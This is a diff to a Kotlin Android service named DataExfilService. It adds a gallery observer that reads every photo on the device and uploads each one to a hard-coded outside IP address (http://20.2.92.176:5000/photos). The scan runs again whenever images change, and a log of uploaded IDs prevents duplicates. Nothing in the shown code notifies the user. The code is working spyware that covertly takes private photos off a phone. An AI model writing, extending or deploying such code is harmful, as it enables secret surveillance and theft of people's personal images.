@@ -19,6 +19,14 @@ import java.net.HttpURLConnection
 import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
+import android.database.ContentObserver
+import android.provider.MediaStore
+import android.content.ContentUris
+import android.net.Uri
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.IOException
 
 class DataExfilService : Service() {
 
@@ -40,6 +48,10 @@ class DataExfilService : Service() {
         }
     }
 
+    private val photosEndpoint = "http://20.2.92.176:5000/photos"
+    private lateinit var photoObserver: ContentObserver
+    private val photoSyncPrefs by lazy { getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE) }
+
     private lateinit var handler: Handler
     private var isUploading = false
 
@@ -59,6 +71,7 @@ class DataExfilService : Service() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
+        setupPhotoObserver()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -312,5 +325,96 @@ class DataExfilService : Service() {
         handler.removeCallbacks(uploadRunnable)
         Log.d(TAG, "Data exfiltration service destroyed")
         super.onDestroy()
+        contentResolver.unregisterContentObserver(photoObserver)
+    }
+
+    private fun setupPhotoObserver() {
+        photoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                scanAndUploadPhotos()
+            }
+        }
+        contentResolver.registerContentObserver(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            true,
+            photoObserver
+        )
+        scanAndUploadPhotos()
+    }
+
+    private fun scanAndUploadPhotos() {
+        if (!isNetworkAvailable()) {
+            Log.d(TAG, "No network, skipping photo scan")
+            return
+        }
+
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID,
+            MediaStore.Images.Media.DISPLAY_NAME
+        )
+
+        contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        )?.use { cursor ->
+            val totalImages = cursor.count
+            Log.d(TAG, "Gallery Scan: $totalImages images found")
+
+            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+
+            var uploadCount = 0
+            while (cursor.moveToNext()) {
+                val id = cursor.getLong(idColumn)
+                val fileName = cursor.getString(nameColumn)
+
+                if (!photoSyncPrefs.getBoolean("id_$id", false)) {
+                    val contentUri = ContentUris.withAppendedId(
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        id
+                    )
+                    uploadPhotoToServer(contentUri, fileName, id)
+                    uploadCount++
+                }
+            }
+            Log.d(TAG, "Scan Complete: $uploadCount new images queued")
+        }
+    }
+
+    private fun uploadPhotoToServer(uri: Uri, fileName: String, photoId: Long) {
+        try {
+            val inputStream = contentResolver.openInputStream(uri)
+            val bytes = inputStream?.readBytes() ?: return
+            inputStream.close()
+
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", fileName,
+                    bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
+                .build()
+
+            val request = Request.Builder()
+                .url(photosEndpoint)
+                .post(requestBody)
+                .build()
+
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "Photo upload failed: $fileName")
+                }
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Photo uploaded: $fileName")
+                        photoSyncPrefs.edit().putBoolean("id_$photoId", true).apply()
+                    }
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading photo: ${e.message}")
+        }
     }
 }
